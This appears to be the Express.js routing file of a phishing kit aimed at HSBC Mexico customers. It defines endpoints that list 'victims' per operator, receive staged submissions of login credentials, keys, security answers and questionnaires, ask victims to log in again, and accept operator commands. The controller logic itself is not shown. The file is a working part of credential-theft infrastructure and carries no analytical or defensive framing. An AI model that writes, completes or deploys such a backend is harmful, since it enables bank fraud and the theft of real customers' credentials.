const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitKey,
	submitSec,
	submitQuestionnaire,
	deleteEntry,
} = require("../controllers/hsbcmxController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/key", submitKey);
router.post("/sec", submitSec);
router.post("/questionnaire", submitQuestionnaire);
router.post("/delete", deleteEntry);

module.exports = router;
